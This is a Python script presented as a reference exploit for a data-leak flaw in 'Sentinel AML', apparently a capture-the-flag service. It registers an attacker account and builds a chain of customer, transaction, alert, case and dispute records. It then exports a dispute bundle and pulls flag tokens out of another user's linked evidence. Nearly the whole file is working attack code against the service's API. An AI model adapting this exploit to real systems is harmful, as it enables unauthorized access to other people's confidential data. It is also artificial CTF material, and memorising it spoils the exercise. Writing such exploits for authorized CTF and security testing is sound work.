#!/usr/bin/env python3
"""Reference exploit for Sentinel AML AML-4 linked export evidence leakage."""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any


DEFAULT_TIMEOUT_SECONDS = 5.0
SERVICE_NAME = "sentinel_aml"
FLAG_PATTERNS = (
    re.compile(r"\b(?:FLAG|CTF|SENTINEL)\{[^}\s]{1,160}\}", re.IGNORECASE),
    re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{31}=(?![A-Za-z0-9+/])"),
)
FORBIDDEN_PUBLIC_KEYS = {
    "checker",
    "checker_secret",
    "confidential_comment",
    "flag",
    "password",
    "private_state",
    "secret",
    "session",
    "token",
    "username",
}


class ExploitError(Exception):
    """Expected exploit failure with a concise operator-facing message."""


class HTTPStatusError(ExploitError):
    def __init__(self, status: int, api_error: str = "") -> None:
        detail = f": {api_error}" if api_error else ""
        super().__init__(f"unexpected HTTP status {status}{detail}")
        self.status = status


class Client:
    def __init__(self, host: str, port: str, timeout: float) -> None:
        self.base_url = normalize_base_url(host, port)
        self.timeout = timeout

    def request_json(
        self,
        method: str,
        path: str,
        payload: dict[str, Any] | None = None,
        token: str | None = None,
        expected_statuses: tuple[int, ...] = (200,),
    ) -> dict[str, Any]:
        url = urllib.parse.urljoin(self.base_url + "/", path.lstrip("/"))
        body = None
        headers = {"Accept": "application/json"}
        if payload is not None:
            body = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
            headers["Content-Type"] = "application/json"
        if token:
            headers["Authorization"] = f"Bearer {token}"

        request = urllib.request.Request(url, data=body, headers=headers, method=method.upper())
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                status = response.getcode()
                raw = response.read()
        except urllib.error.HTTPError as exc:
            status = exc.code
            raw = exc.read()
        except (OSError, TimeoutError, urllib.error.URLError) as exc:
            raise ExploitError("service request failed") from exc

        decoded = decode_json(raw)
        if status not in expected_statuses:
            raise HTTPStatusError(status, str(decoded.get("error", "")))
        return decoded


def main(argv: list[str] | None = None) -> int:
    args = parse_args(sys.argv[1:] if argv is None else argv)
    try:
        attack_data = load_attack_data(args.attack_info)
        flag = run_exploit(args.host, args.port, attack_data, timeout=args.timeout)
    except ExploitError as exc:
        print(f"aml_export_redaction: {exc}", file=sys.stderr)
        return 1
    print(flag)
    return 0


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Exploit AML-4 dispute export linked evidence leakage")
    parser.add_argument("host", help="target service host or base URL")
    parser.add_argument("port", help="target service port, or '-' when host already includes a port")
    parser.add_argument("attack_info", help="public attack-info JSON object or path to a JSON file")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT_SECONDS, help="HTTP timeout in seconds")
    return parser.parse_args(argv)


def load_attack_data(raw: str) -> dict[str, Any]:
    candidate = Path(raw)
    if not raw.lstrip().startswith("{") and candidate.is_file():
        raw = candidate.read_text(encoding="utf-8")
    try:
        decoded = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise ExploitError("attack info must be JSON or a path to JSON") from exc
    if not isinstance(decoded, dict):
        raise ExploitError("attack info must be a JSON object")
    nested = decoded.get("attack_data")
    if isinstance(nested, dict):
        decoded = nested
    validate_attack_data(decoded)
    return decoded


def validate_attack_data(attack_data: dict[str, Any]) -> None:
    forbidden = sorted(key for key in flatten_keys(attack_data) if public_key_forbidden(key))
    if forbidden:
        raise ExploitError("public attack data contains forbidden credential or confidential fields")
    if any(public_value_forbidden(value) for value in flatten_scalar_values(attack_data)):
        raise ExploitError("public attack data contains forbidden credential or flag-like values")
    if attack_data.get("service") not in (None, SERVICE_NAME):
        raise ExploitError("attack data is for a different service")
    if not int_locator(attack_data, "case_id", "case_ref"):
        raise ExploitError("AML-4 exploit requires public victim case_id")
    if not text_locator(attack_data, "matching_reference"):
        raise ExploitError("AML-4 exploit requires public matching_reference")
    if not any(text_locator(attack_data, key) for key in ("customer_id", "customer_ref", "entity_ref", "party_ref")):
        raise ExploitError("AML-4 exploit requires public locator metadata")


def run_exploit(host: str, port: str, attack_data: dict[str, Any], timeout: float) -> str:
    client = Client(host, port, timeout)
    suffix = stable_suffix(attack_data)
    token = register_and_login(client, suffix)
    root_case_id = create_attacker_case(client, token, attack_data, suffix)
    dispute_id = create_dispute(client, token, root_case_id, suffix)
    created_export = create_dispute_export(client, token, dispute_id)
    export_id = require_int(created_export, "id")
    stored_export = client.request_json("GET", f"/api/exports/{export_id}", token=token)

    for payload in (stored_export, created_export):
        for value in iter_linked_evidence_values(payload):
            flag = extract_flag(value)
            if flag:
                return flag
    raise ExploitError("flag-like token not found in linked evidence content")


def register_and_login(client: Client, suffix: str) -> str:
    username = f"aml4_attacker_{suffix[:24]}"
    password = hashlib.sha256(("aml4-password:" + suffix).encode("utf-8")).hexdigest()[:32]
    try:
        client.request_json(
            "POST",
            "/api/auth/register",
            {"username": username, "password": password},
            expected_statuses=(201,),
        )
    except HTTPStatusError as exc:
        if exc.status != 409:
            raise
    response = client.request_json("POST", "/api/auth/login", {"username": username, "password": password})
    token = response.get("session", {}).get("token") if isinstance(response.get("session"), dict) else None
    if not isinstance(token, str) or not token:
        raise ExploitError("login response did not include a bearer token")
    return token


def create_attacker_case(client: Client, token: str, attack_data: dict[str, Any], suffix: str) -> int:
    last_error: Exception | None = None
    for attempt in range(50):
        try:
            return create_attacker_case_attempt(client, token, attack_data, suffix, attempt)
        except HTTPStatusError as exc:
            last_error = exc
            if exc.status != 409:
                raise
    raise ExploitError(f"could not create attacker export workflow: {last_error}")


def create_attacker_case_attempt(client: Client, token: str, attack_data: dict[str, Any], suffix: str, attempt: int) -> int:
    short = f"{suffix[:18]}-{attempt:02d}"
    customer = client.request_json(
        "POST",
        "/api/customers",
        {
            "display_name": f"AML4 Attacker {short}",
            "customer_type": "organization",
            "country": "US",
            "registration_number": f"AML4-ATTACK-{short}",
            "risk_level": "medium",
            "entity_hint": text_locator(attack_data, "entity_ref", "party_ref") or f"aml4-attacker-{short}",
        },
        token=token,
        expected_statuses=(201,),
    )
    customer_id = require_int(customer, "id")
    account = client.request_json(
        "POST",
        f"/api/customers/{customer_id}/accounts",
        {"iban_like": f"AML4{short.upper().replace('-', '')[:20]}", "currency": "USD"},
        token=token,
        expected_statuses=(201,),
    )
    account_id = require_int(account, "id")
    transaction = client.request_json(
        "POST",
        "/api/transactions",
        {
            "account_id": account_id,
            "counterparty_name": "AML4 Reference Counterparty",
            "counterparty_country": "GB",
            "counterparty_fingerprint": f"aml4-reference-{short}",
            "amount": "60000.00",
            "currency": "USD",
            "direction": "outbound",
            "purpose": "invoice",
            "trace_id": f"aml4-reference-{short}",
        },
        token=token,
        expected_statuses=(201,),
    )
    transaction_id = require_int(transaction, "id")
    alert_id = find_alert_for_transaction(client, token, transaction_id)
    client.request_json("POST", f"/api/alerts/{alert_id}/claim", token=token)
    case = client.request_json(
        "POST",
        f"/api/alerts/{alert_id}/case",
        {
            "public_summary": f"AML4 dispute export root {short}",
            "dedup_hint": text_locator(attack_data, "matching_reference"),
        },
        token=token,
        expected_statuses=(201,),
    )
    return require_int(case, "id")


def find_alert_for_transaction(client: Client, token: str, transaction_id: int) -> int:
    alerts = client.request_json("GET", "/api/alerts/queue", token=token).get("alerts")
    if not isinstance(alerts, list):
        raise ExploitError("alert queue response is malformed")
    for alert in alerts:
        if isinstance(alert, dict) and alert.get("transaction_id") == transaction_id and positive_int(alert.get("id")):
            return int(alert["id"])
    raise ExploitError("attacker transaction did not produce an alert")


def create_dispute(client: Client, token: str, case_id: int, suffix: str) -> int:
    response = client.request_json(
        "POST",
        "/api/disputes",
        {"case_id": case_id, "reason": f"AML4 regulatory export review {suffix[:12]}"},
        token=token,
        expected_statuses=(201,),
    )
    return require_int(response, "id")


def create_dispute_export(client: Client, token: str, dispute_id: int) -> dict[str, Any]:
    return client.request_json(
        "POST",
        f"/api/disputes/{dispute_id}/export",
        {"purpose": "regulatory_report"},
        token=token,
        expected_statuses=(201,),
    )


def iter_linked_evidence_values(export_response: dict[str, Any]):
	bundle = export_response.get("bundle")
	if not isinstance(bundle, dict):
		return
	items = bundle.get("linked_evidence")
	if not isinstance(items, list):
		return
	for item in items:
		if not isinstance(item, dict):
			continue
		for key in ("content", "evidence_excerpt", "excerpt", "caption"):
			value = item.get(key)
			if isinstance(value, str):
				yield value


def extract_flag(text: str) -> str | None:
    for pattern in FLAG_PATTERNS:
        match = pattern.search(text)
        if match:
            return match.group(0)
    return None


def normalize_base_url(host: str, port: str) -> str:
    host = host.strip()
    port = port.strip()
    if not host:
        raise ExploitError("host is required")
    if "://" not in host:
        host = "http://" + host
    parsed = urllib.parse.urlsplit(host)
    if port and port != "-" and parsed.port is None:
        netloc = parsed.netloc or parsed.path
        host = urllib.parse.urlunsplit((parsed.scheme, f"{netloc}:{port}", "", "", ""))
    return host.rstrip("/")


def decode_json(raw: bytes) -> dict[str, Any]:
    if not raw:
        return {}
    try:
        decoded = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ExploitError("response body is not valid JSON") from exc
    if not isinstance(decoded, dict):
        raise ExploitError("response body must be a JSON object")
    return decoded


def require_int(payload: dict[str, Any], key: str) -> int:
    value = payload.get(key)
    if not positive_int(value):
        raise ExploitError(f"response field {key} is missing")
    return int(value)


def positive_int(value: Any) -> bool:
    if isinstance(value, int):
        return value > 0
    return isinstance(value, str) and value.isdecimal() and int(value) > 0


def int_locator(payload: dict[str, Any], *keys: str) -> int | None:
    for key in keys:
        value = payload.get(key)
        if positive_int(value):
            return int(value)
        if isinstance(value, str):
            match = re.search(r"(\d+)$", value.strip())
            if match and int(match.group(1)) > 0:
                return int(match.group(1))
    return None


def text_locator(payload: dict[str, Any], *keys: str) -> str:
    for key in keys:
        value = payload.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip()
        if isinstance(value, int) and value > 0:
            return str(value)
    return ""


def stable_suffix(attack_data: dict[str, Any]) -> str:
    material = json.dumps(attack_data, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(material.encode("utf-8")).hexdigest()[:24]


def flatten_keys(value: Any):
    if isinstance(value, dict):
        for key, nested in value.items():
            yield str(key)
            yield from flatten_keys(nested)
    elif isinstance(value, list):
        for item in value:
            yield from flatten_keys(item)


def flatten_scalar_values(value: Any):
    if isinstance(value, dict):
        for nested in value.values():
            yield from flatten_scalar_values(nested)
    elif isinstance(value, list):
        for item in value:
            yield from flatten_scalar_values(item)
    elif isinstance(value, (str, int, float, bool)):
        yield str(value)


def public_key_forbidden(key: str) -> bool:
    normalized = key.strip().lower().replace("-", "_")
    return (
        normalized in FORBIDDEN_PUBLIC_KEYS
        or normalized.endswith("_token")
        or normalized.endswith("_password")
        or normalized.startswith("flag")
        or "private_state" in normalized
        or "confidential" in normalized
    )


def public_value_forbidden(value: str) -> bool:
    lowered = value.lower()
    return (
        bool(extract_flag(value))
        or "bearer " in lowered
        or "confidential" in lowered
        or "casenote.body" in lowered
        or "eddrecord" in lowered
    )


if __name__ == "__main__":
    raise SystemExit(main())
